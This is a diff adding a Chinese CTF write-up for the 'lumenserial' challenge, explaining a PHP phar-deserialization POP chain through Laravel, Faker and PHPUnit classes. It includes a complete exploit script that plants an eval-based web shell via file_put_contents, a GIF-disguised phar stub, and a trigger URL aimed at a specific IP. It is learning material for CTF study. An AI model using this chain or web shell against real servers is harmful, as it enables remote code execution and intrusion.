@@ -405,7 +405,7 @@ https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html
 
 ![](Code-Breaking-Puzzles-题解-学习篇\10.png)
 
-测试了Java和PHP貌似没有这个特性。遂用Python跑了一边所有字符集。（可能没跑全？
+测试了Java和PHP貌似没有这个特性? 遂用Python跑了一边所有字符集。（可能没跑全？
 
 ```
 K ---- k
@@ -422,6 +422,278 @@ https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html
 ```
 
 貌似确实只有P神提到的三个比较有用一点。（狂绕waf就完事了。。。
+
+# lumenserial
+
+复现为主，学习为主。太菜了，没办法。
+
+## 前期
+
+下载下来之后先`composer install`安装好依赖。
+
+然后可以看到`download`函数里有个`file_get_contents`，传入了个url，这个参数是可以通过get方式传入，完全可控的。
+
+```php
+private function download($url)
+{
+    $maxSize = $this->config['catcherMaxSize'];
+    $limitExtension = array_map(function ($ext) {
+        return ltrim($ext, '.');
+    }, $this->config['catcherAllowFiles']);
+    $allowTypes = array_map(function ($ext) {
+        return "image/{$ext}";
+    }, $limitExtension);
+
+    $content = file_get_contents($url);
+    ...
+```
+
+然后就可以利用`file_get_contents`来进行phar反序列化，文件上传点比较好找，允许直接上传图片。
+
+当然这里只是开始。最主要的就是寻找POP链，由于是用了很多框架一起的，所以在这种情况下，寻找POP链的机会会多很多。（但是也比较难找
+
+还有一个比较重要的一点是，由于禁用了许多系统函数
+
+```php
+system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log  
+```
+
+并且php版本为7.2，也就意味着不能动态调用`assert`函数，这样的话，反序列化时可能就需要触发`file_put_contents`这些需要调用两个参数的函数。对于反序列化的要求就更为苛刻了。
+
+## 寻找POP Chain
+
+这里主要分析一下柠檬师傅的这条php chain（貌似和rr巨佬的链是一样的。
+
+首先思路是先从`__destruct`出发，去寻找一些动态调用，然后触发到`__call`从而去触发到想要的危险函数。
+
+### PendingBroadcast
+
+`illuminate/broadcasting/PendingBroadcast.php:55`里的`__destruct`看到调用了`events`的`dispatch`。
+
+
+```php
+public function __destruct()
+{
+    $this->events->dispatch($this->event);
+}
+```
+
+常规的一些类中`dispatch`里没有危险函数，那就将目光转向一些类的`__call`方法。
+
+### ValidGenerator
+
+`fzaninotto/faker/src/Faker/ValidGenerator.php:52`里的`__call`方法调用了个两个动态调用函数。
+
+```php
+public function __call($name, $arguments)
+{
+    $i = 0;
+    do {
+        $res = call_user_func_array(array($this->generator, $name), $arguments);
+        $i++;
+        if ($i > $this->maxRetries) {
+            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));
+        }
+        var_dump($this->validator);
+        echo "<br>";
+        var_dump($res);
+    } while (!call_user_func($this->validator, $res));
+
+    return $res;
+}
+```
+
+这里传入的`$name`是不可控的，为传入的`dispatch`，这样第一次的
+
+```php
+$res = call_user_func_array(array($this->generator, $name), $arguments);
+```
+
+意味着暂时也无法完全控制，但是需要找一个可以类，可以控制其返回值，从而让`$res`可控，进而while处的
+
+```php
+call_user_func($this->validator, $res)
+```
+
+**需要特别注意**的一点是，这里的`$arguments`通过之前的`__call`方法传入的时候，变成了一个数组，并且只能控制第一个索引的数组，所以有一定的限制。（一开始绕了好久
+
+### Generator
+
+`fzaninotto/faker/src/Faker/Generator.php:277`
+
+```php
+public function __call($method, $attributes)
+{
+    return $this->format($method, $attributes);
+}
+```
+
+`format()`
+
+```php
+public function format($formatter, $arguments = array())
+{
+    return call_user_func_array($this->getFormatter($formatter), $arguments);
+}
+```
+
+`getFormatter()`
+
+```php
+public function getFormatter($formatter)
+{
+    if (isset($this->formatters[$formatter])) {
+        return $this->formatters[$formatter];
+    }
+    ....
+```
+
+可以看到`__call`处的`$method`不可控，这样就不能控制`format()`中的`$formatter`
+
+庆幸的是在`getFormatter()`中`$this->formatters`是可以通过反序列化控制的，这样，就可以传入一个我们想要的数组，然后触发对应类的函数。
+
+然后由于`$arguments`的原因，现在的pop链还不算特别好。这里选择了在`Generator`类中再次调用`Generator`类，嵌套调用。（真的给跪了。。。
+
+```php
+$g2->formatters = array('kingkk' => $evalobj);
+$g1->formatters = array(
+    "dispatch" => array(
+        $g2, 
+        "getFormatter",
+    )
+);
+```
+
+第一次先通过g1调用g2中的`getFormatter`，然后这是时候就可以通过g2的`getFormatter()`返回其他任意类，控制`ValidGenerator`中的`$res`。
+
+（g1和g2只是类中变量不同的两个`Gennerator`类。这里确实满饶的，理了好久。。
+
+可以返回任意类时就需要找一个比较好一点的类。
+
+### StaticInvocation
+
+`phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26`
+
+```php
+public function invoke(Invocation $invocation)
+{
+    return \call_user_func_array($this->callback, $invocation->getParameters());
+}
+```
+
+这里调用了`call_user_func_array`并且两个参数都是反序列化可控的。由于`Invocation`只是个接口。找到具体的实现类即可。
+
+```php
+class StaticInvocation implements Invocation, SelfDescribing
+{    
+    public function getMethodName(): string
+    {
+        return $this->methodName;
+    }
+}
+```
+
+返回这个类，最后通过`ValidGenerator`中的
+
+```php
+while (!call_user_func($this->validator, $res));
+```
+
+完全全部攻击链
+
+## EXP
+
+根据之前的分析，就可以写出EXP
+
+```php
+<?php
+
+/**
+ * @Author: King kaki
+ * @Date:   2018-12-03 20:48:26
+ * @Last Modified by:   King kaki
+ * @Last Modified time: 2018-12-04 21:18:08
+ */
+
+namespace Illuminate\Broadcasting{
+	class PendingBroadcast{
+		function __construct(){
+			$this->events = new \Faker\ValidGenerator();
+			$this->event = 'kingkk';
+		}
+	}
+}
+
+
+namespace PHPUnit\Framework\MockObject\Invocation{
+	class StaticInvocation{
+		function __construct(){
+			$this->parameters = array('/var/www/html/upload/k.php','<?php phpinfo();eval($_POST["k"]);?>');
+		}
+	}
+}
+
+namespace PHPUnit\Framework\MockObject\Stub{
+	class ReturnCallback{
+		function __construct(){
+			$this->callback = 'file_put_contents';
+		}
+	}
+}
+
+namespace Faker{
+	class ValidGenerator{
+		function __construct(){
+			$si = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();
+			$g1 = new \Faker\Generator(array('kingkk' => $si ));
+			$g2 = new \Faker\Generator(array("dispatch" => array($g1, "getFormatter")));
+
+			$rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();
+
+			$this->validator = array($rc, "invoke");
+			$this->generator = $g2;
+			$this->maxRetries = 10000;
+		}
+	}
+
+	class Generator{
+        function __construct($form){
+            $this->formatters = $form;
+        }
+	}
+
+}
+namespace{
+	$exp = new Illuminate\Broadcasting\PendingBroadcast();
+	print_r(urlencode(serialize($exp)));
+
+	// phar
+	$p = new Phar('./k.phar', 0);
+    $p->startBuffering();
+    $p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
+    $p->setMetadata($exp);
+    $p->addFromString('1.txt','text');
+    $p->stopBuffering();
+}
+```
+
+然后就是上传一波图片，图片地址在返回的json数据中就能看到。再利用一开始的`file_get_contents`触发反序列化链即可。
+
+```
+http://51.158.73.123:8080/server/editor?action=Catchimage&source[]=phar:///var/www/html/upload/image/xxx.gif
+```
+
+## 最后
+
+最后，学习了。中间分析的过程尤其是两次`Generator`的调用，是有点晕，差点没转过弯来。膜柠檬师傅。
+
+感觉随着phar的火爆，在利用框架写的系统中，反序列化会愈发频繁，寻找pop chain也会是一种比较重要的能力。而且随着一些函数禁用和php版本的原因，寻找这种`call_user_func_array`的调用确实也是一种实际需求。
+
+
+
+
+
+
 
 
 
@@ -440,3 +712,5 @@ http://www.laruence.com/2010/06/08/1579.html
 https://www.leavesongs.com/PENETRATION/php-filter-magic.html
 
 https://www.cnblogs.com/iamstudy/articles/code_breaking_writeup.html
+
+https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html
